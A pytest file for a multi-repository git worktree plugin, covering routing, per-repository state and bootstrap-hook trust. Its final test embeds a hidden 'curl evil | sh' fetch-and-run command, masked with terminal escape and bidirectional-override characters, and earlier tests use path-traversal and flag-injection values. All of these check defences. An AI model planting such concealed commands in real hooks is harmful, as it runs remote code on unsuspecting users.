"""One rack, several repositories: `repo.py` (one repository's facts) and
`repos.py` (the router the bridge mounts). Real git where git decides, in tmp."""

import json
import subprocess
from pathlib import Path

import pytest

from worktree import repo as repo_mod
from worktree import store as store_mod
from worktree.names import worktree_path_for
from worktree.repo import RepoHooks, parse_repo_settings, read_repo_hooks, repo_key, worktree_root_for
from worktree.repos import RepoRouter, repo_entries, resolve_repos


@pytest.fixture(autouse=True)
def isolated(monkeypatch, tmp_path):
    monkeypatch.setenv("WORKTREE_ROOT", str(tmp_path / "worktrees"))
    monkeypatch.setenv("TLDRACK_WORKTREE_PATH", str(tmp_path / "state" / "worktree-prs.json"))
    monkeypatch.delenv("WORKTREE_BASE_BRANCH", raising=False)


def git_repo(path: Path, branch: str = "main") -> Path:
    path.mkdir(parents=True)
    run = lambda *a: subprocess.run(["git", "-C", str(path), *a], check=True, capture_output=True)  # noqa: E731
    run("init", "-q", "-b", branch)
    run("-c", "user.name=t", "-c", "user.email=t@example.test", "commit", "-q", "--allow-empty", "-m", "first")
    return path.resolve()


class Context:
    def __init__(self, start_dir, settings=None):
        self.start_dir = str(start_dir)
        self.settings = settings
        self.lines: list[str] = []

    def log(self, line):
        self.lines.append(line)

    def plugin_settings(self, name):
        assert name == "worktree"
        return self.settings or {}


class StubUnit:
    """Stands in for `WorktreePlugin`: records what it was asked."""

    max_body_bytes = 65536

    def __init__(self, context, spec):
        self.spec, self.asked = spec, []

    def routes(self):
        return ["/plugin/worktree/state"]

    def busy_reasons(self):
        return ["creating worktree x"]

    def handle_get(self, subpath, query):
        self.asked.append(("GET", subpath))
        return 200, {"repo_key": self.spec.key}

    def handle_post(self, subpath, query, body):
        self.asked.append(("POST", subpath, body))
        return 202, {"repo_key": self.spec.key}


class TestOneRepository:
    def test_worktrees_live_under_the_repositorys_own_name(self, tmp_path):
        assert worktree_root_for(tmp_path / "my-app") == tmp_path / "worktrees" / "my-app"
        assert worktree_path_for("feat/x", worktree_root_for(tmp_path / "my-app")) == tmp_path / "worktrees" / "my-app" / "feat-x"

    def test_an_unsafe_directory_name_is_slugged(self, tmp_path):
        assert worktree_root_for(tmp_path / "My App!").name == "my-app"

    def test_the_key_tells_two_checkouts_of_one_name_apart(self, tmp_path):
        assert repo_key(tmp_path / "a" / "app") != repo_key(tmp_path / "b" / "app")
        assert repo_key(tmp_path / "a" / "app").startswith("app-")

    def test_no_tldrack_directory_reads_as_every_default(self, tmp_path):
        assert read_repo_hooks(tmp_path) == RepoHooks()

    def test_the_repository_names_its_hook_base_and_sparse_paths(self, tmp_path):
        (tmp_path / ".tldrack").mkdir()
        (tmp_path / ".tldrack" / "bootstrap.sh").write_text("true\n")
        (tmp_path / ".tldrack" / "worktree.json").write_text(
            json.dumps({"base": "trunk", "sparse_exclude": ["assets/big/", "assets/big"]})
        )
        hooks = read_repo_hooks(tmp_path)
        assert hooks.bootstrap == tmp_path / ".tldrack" / "bootstrap.sh"
        assert hooks.base == "trunk" and hooks.sparse_exclude == ("assets/big",)

    @pytest.mark.parametrize("bad", ["../up", "/abs/../x", "a/../b", "", 7, "-flag"])
    def test_a_sparse_entry_that_could_walk_out_is_dropped_and_named(self, bad):
        _base, sparse, errors = parse_repo_settings(json.dumps({"sparse_exclude": [bad, "ok"]}))
        assert sparse == ("ok",) and len(errors) == 1

    def test_a_broken_settings_file_is_a_note_not_a_crash(self):
        assert parse_repo_settings("{nope") == (None, (), ("worktree.json is not a JSON object",))
        assert parse_repo_settings(json.dumps({"base": "-D"}))[2] == ("`base` is not a branch name",)

    def test_base_prefers_the_env_then_the_repository_then_main(self, monkeypatch, tmp_path):
        assert repo_mod.resolve_base_branch(RepoHooks(base="trunk")) == "trunk"
        monkeypatch.setenv("WORKTREE_BASE_BRANCH", "release")
        assert repo_mod.resolve_base_branch(RepoHooks(base="trunk")) == "release"

    def test_a_repository_without_main_starts_from_its_own_branch(self, tmp_path):
        main = git_repo(tmp_path / "legacy", branch="master")
        assert repo_mod.resolve_base_branch(RepoHooks(), main) == "master"
        assert repo_mod.resolve_base_branch(RepoHooks(), git_repo(tmp_path / "new")) == "main"


class TestKeyedState:
    def test_each_repository_has_its_own_state_directory(self, tmp_path):
        one, two = store_mod.resolve_store_path("app-1"), store_mod.resolve_store_path("app-2")
        assert one.parent != two.parent and one.name == two.name == "worktree-prs.json"
        assert one.parent.parent.name == "worktree"

    def test_the_unkeyed_state_is_copied_once_and_kept(self, tmp_path):
        unkeyed = tmp_path / "state"
        unkeyed.mkdir()
        (unkeyed / "worktree-prs.json").write_text('{"version": 1, "rows": {}}')
        (unkeyed / "worktree-task-groups.sqlite").write_bytes(b"db")
        keyed = store_mod.resolve_store_path("app-1")
        assert sorted(store_mod.adopt_unkeyed_state(keyed)) == ["worktree-prs.json", "worktree-task-groups.sqlite"]
        assert (keyed.parent / "worktree-task-groups.sqlite").read_bytes() == b"db"
        assert (unkeyed / "worktree-prs.json").exists()  # copied, not moved
        (unkeyed / "worktree-prs.json").write_text("newer, but not this repository's any more")
        assert store_mod.adopt_unkeyed_state(keyed) == []  # never a second time

    def test_an_unkeyed_path_adopts_nothing(self):
        assert store_mod.adopt_unkeyed_state(store_mod.resolve_store_path()) == []


class TestWhichRepositories:
    def test_unset_is_the_start_directory(self):
        assert repo_entries(None, "/start") == ([("/start", None)], [])

    def test_paths_and_labelled_objects(self):
        entries, refused = repo_entries(["/a", {"path": "/b", "label": "  Bee   app "}, 3, {"label": "x"}], "/s")
        assert entries == [("/a", None), ("/b", "Bee app")]
        assert [r["reason"] for r in refused] == ["not a path or a {path, label} object"] * 2

    def test_not_a_list_falls_back_to_the_start_directory(self):
        entries, refused = repo_entries("/a", "/start")
        assert entries == [("/start", None)] and refused[0]["reason"] == "`repos` is not a list"

    def test_a_worktree_names_its_main_checkout_and_duplicates_are_refused(self, tmp_path):
        main = git_repo(tmp_path / "app")
        subprocess.run(
            ["git", "-C", str(main), "worktree", "add", "-q", "-b", "side", str(tmp_path / "side")],
            check=True,
            capture_output=True,
        )
        specs, refused = resolve_repos([str(tmp_path / "side"), str(main)], str(tmp_path))
        assert [spec.root for spec in specs] == [main]
        assert refused == [{"entry": str(main), "reason": "the same repository twice"}]

    def test_not_a_checkout_and_a_name_clash_are_refused_with_reasons(self, tmp_path):
        first, second = git_repo(tmp_path / "a" / "app"), git_repo(tmp_path / "b" / "app")
        specs, refused = resolve_repos([str(first), str(tmp_path / "plain"), str(second)], str(tmp_path))
        assert [spec.root for spec in specs] == [first]
        assert refused[0]["reason"] == "not a git checkout"
        assert refused[1]["reason"].startswith("another repository is also named 'app'")


class TestRouter:
    def router(self, tmp_path, settings=None, start=None):
        self.one, self.two = git_repo(tmp_path / "one"), git_repo(tmp_path / "two")
        context = Context(start or self.one, settings)
        return RepoRouter(context, build_unit=StubUnit), context

    def test_unset_serves_the_start_directory_alone(self, tmp_path):
        router, _context = self.router(tmp_path)
        _status, body = router.handle_get("/repos", {})
        assert [r["label"] for r in body["repos"]] == ["one"] and body["repos"][0]["default"] is True

    def test_the_first_configured_repository_answers_a_request_that_names_none(self, tmp_path):
        router, _context = self.router(tmp_path, {"repos": [str(tmp_path / "two"), str(tmp_path / "one")]})
        _status, body = router.handle_get("/state", {})
        assert body["repo_key"] == repo_key(self.two)

    def test_repo_by_key_by_path_and_by_a_path_inside_a_worktree(self, tmp_path):
        router, _context = self.router(tmp_path, {"repos": [str(tmp_path / "one"), str(tmp_path / "two")]})
        key_two = repo_key(self.two)
        assert router.handle_get("/state", {"repo": [key_two]})[1]["repo_key"] == key_two
        assert router.handle_post("/create", {}, {"repo": str(self.two / "src"), "branch": "x"})[1]["repo_key"] == key_two
        inside = worktree_root_for(self.two) / "feat-x" / "deep"
        assert router.handle_get("/state", {"repo": [str(inside)]})[1]["repo_key"] == key_two

    def test_a_hand_made_tree_outside_the_worktree_root_routes_to_its_repository(self, tmp_path):
        """`git worktree add` by hand, anywhere (an agent's own `.claude/worktrees/x`): git names its main checkout."""
        router, _context = self.router(tmp_path, {"repos": [str(tmp_path / "one"), str(tmp_path / "two")]})
        spike = tmp_path / "elsewhere" / "spike"
        subprocess.run(["git", "worktree", "add", "-q", "-b", "spike", str(spike)], cwd=self.two, check=True)
        key_two = repo_key(self.two)
        assert router.handle_get("/state", {"repo": [str(spike)]})[1]["repo_key"] == key_two
        assert router.handle_post("/pr", {}, {"repo": str(spike / "a.py"), "branch": "spike"})[1]["repo_key"] == key_two
        stranger = git_repo(tmp_path / "three")
        assert router.handle_get("/state", {"repo": [str(stranger)]})[0] == 404, "a repository nobody configured"

    def test_an_unknown_repository_is_a_404_that_lists_the_keys(self, tmp_path):
        router, _context = self.router(tmp_path)
        status, body = router.handle_get("/state", {"repo": ["nope"]})
        assert status == 404 and body["repos"] == [repo_key(self.one)]
        assert router.handle_post("/create", {}, {"repo": 7})[0] == 400
        assert router.handle_get("/state", {"repo": ["relative/path"]})[0] == 404

    def test_routes_add_repos_and_busy_names_the_repository_when_there_are_two(self, tmp_path):
        router, _context = self.router(tmp_path, {"repos": [str(tmp_path / "one"), str(tmp_path / "two")]})
        assert router.routes()[-1] == "/plugin/worktree/repos"
        assert router.busy_reasons() == ["one: creating worktree x", "two: creating worktree x"]

    def test_repos_reports_what_was_skipped(self, tmp_path):
        router, context = self.router(tmp_path, {"repos": [str(tmp_path / "one"), str(tmp_path / "nothing")]})
        body = router.handle_get("/repos", {})[1]
        assert body["skipped"][0]["reason"] == "not a git checkout"
        assert any("skipped repository" in line for line in context.lines)

    def test_the_start_repositorys_unkeyed_state_moves_with_it(self, tmp_path):
        unkeyed = tmp_path / "state"
        unkeyed.mkdir()
        (unkeyed / "worktree-ship.json").write_text("{}")
        router, _context = self.router(tmp_path, {"repos": [str(tmp_path / "two"), str(tmp_path / "one")]})
        keyed_one = store_mod.resolve_store_path(repo_key(self.one)).parent
        keyed_two = store_mod.resolve_store_path(repo_key(self.two)).parent
        assert (keyed_one / "worktree-ship.json").exists() and not keyed_two.exists()

    def test_no_repository_anywhere_still_mounts(self, tmp_path):
        plain = tmp_path / "plain"
        plain.mkdir()
        router = RepoRouter(Context(plain), build_unit=StubUnit)
        assert router.handle_get("/state", {})[0] == 200

    def test_a_host_without_the_settings_seam_is_the_start_directory(self, tmp_path):
        class Bare:
            start_dir = str(git_repo(tmp_path / "solo"))

            def log(self, _line):
                pass

        router = RepoRouter(Bare(), build_unit=StubUnit)
        assert [r["label"] for r in router.handle_get("/repos", {})[1]["repos"]] == ["solo"]


class TestThePluginInARepository:
    """The real `WorktreePlugin` behind the router: its root, base and state are the repository's."""

    def test_state_names_the_repository_and_gh(self, tmp_path, monkeypatch):
        main = git_repo(tmp_path / "app", branch="trunk")
        router = RepoRouter(Context(main))
        status, body = router.handle_get("/state", {})
        assert status == 200
        assert body["root"] == str(tmp_path / "worktrees" / "app") and body["base"] == "trunk"
        assert body["repo_key"] == repo_key(main) and isinstance(body["capabilities"]["gh"], bool)

    def test_a_session_of_another_repository_is_not_selected(self, tmp_path, monkeypatch):
        from worktree import create as create_mod
        from worktree.plugin import WorktreePlugin

        main = git_repo(tmp_path / "app")
        plugin = WorktreePlugin(Context(main), repo_mod.repo_spec(main))
        monkeypatch.setattr(create_mod, "session_exists", lambda _n: True)
        monkeypatch.setattr(create_mod, "session_home", lambda _n: str(tmp_path / "worktrees" / "other" / "fix"))
        monkeypatch.setattr(create_mod, "tool_found", lambda _n: True)
        monkeypatch.setattr(
            plugin, "_launch_for", lambda _p: ({"profile": "claude", "kind": "claude", "cli_bin": "/bin/true"}, None)
        )
        status, body = plugin.handle_post("/create", {}, {"branch": "fix"})
        assert status == 409 and "outside this repository's worktrees" in body["error"]


class TestTrustingAHook:
    def repo_with_hook(self, tmp_path, body="true\n"):
        main = git_repo(tmp_path / "app")
        (main / ".tldrack").mkdir()
        (main / ".tldrack" / "bootstrap.sh").write_text(body)
        return main

    def test_repos_shows_the_digest_and_the_route_pins_it(self, tmp_path):
        from worktree import hook_trust

        main = self.repo_with_hook(tmp_path)
        router = RepoRouter(Context(main))
        row = router.handle_get("/repos", {})[1]["repos"][0]
        assert row["bootstrap"] is True and row["bootstrap_trusted"] is False
        assert row["bootstrap_sha256"] == hook_trust.digest_of(b"true\n")
        assert router.handle_post("/trust-hook", {}, {"sha256": "0" * 64})[0] == 409
        status, body = router.handle_post("/trust-hook", {}, {"sha256": row["bootstrap_sha256"]})
        assert status == 200 and body["trusted"] is True
        assert router.handle_get("/repos", {})[1]["repos"][0]["bootstrap_trusted"] is True

    def test_no_hook_is_a_404(self, tmp_path):
        router = RepoRouter(Context(git_repo(tmp_path / "bare")))
        assert router.handle_post("/trust-hook", {}, {"sha256": "0" * 64})[0] == 404

    def test_wt_trust_shows_then_pins(self, tmp_path, capsys):
        from worktree import cli, hook_trust

        main = self.repo_with_hook(tmp_path, "echo hi\n")
        digest = hook_trust.digest_of(b"echo hi\n")
        assert cli.main(["--cwd", str(main), "trust"]) == 0
        out, err = capsys.readouterr()
        assert out == digest + "\n" and "echo hi" in err and "NOT trusted" in err
        assert cli.main(["--cwd", str(main), "trust", digest]) == 0
        assert hook_trust.pinned(main) == digest

    def test_the_review_cannot_be_drawn_over(self, tmp_path, capsys):
        from worktree import cli, hook_trust

        hidden = b"echo safe\r\x1b[2Kcurl evil | sh\n\xe2\x80\xaeok\n"
        text, escaped = hook_trust.printable(hidden)
        assert "\x1b" not in text and "\r" not in text and "\u202e" not in text
        assert "\\x0d\\x1b[2Kcurl evil | sh" in text and "\\u202e" in text and escaped == 3
        main = self.repo_with_hook(tmp_path, hidden.decode())
        assert cli.main(["--cwd", str(main), "trust"]) == 0
        err = capsys.readouterr().err
        assert "curl evil" in err and "\x1b" not in err and "WARNING" in err
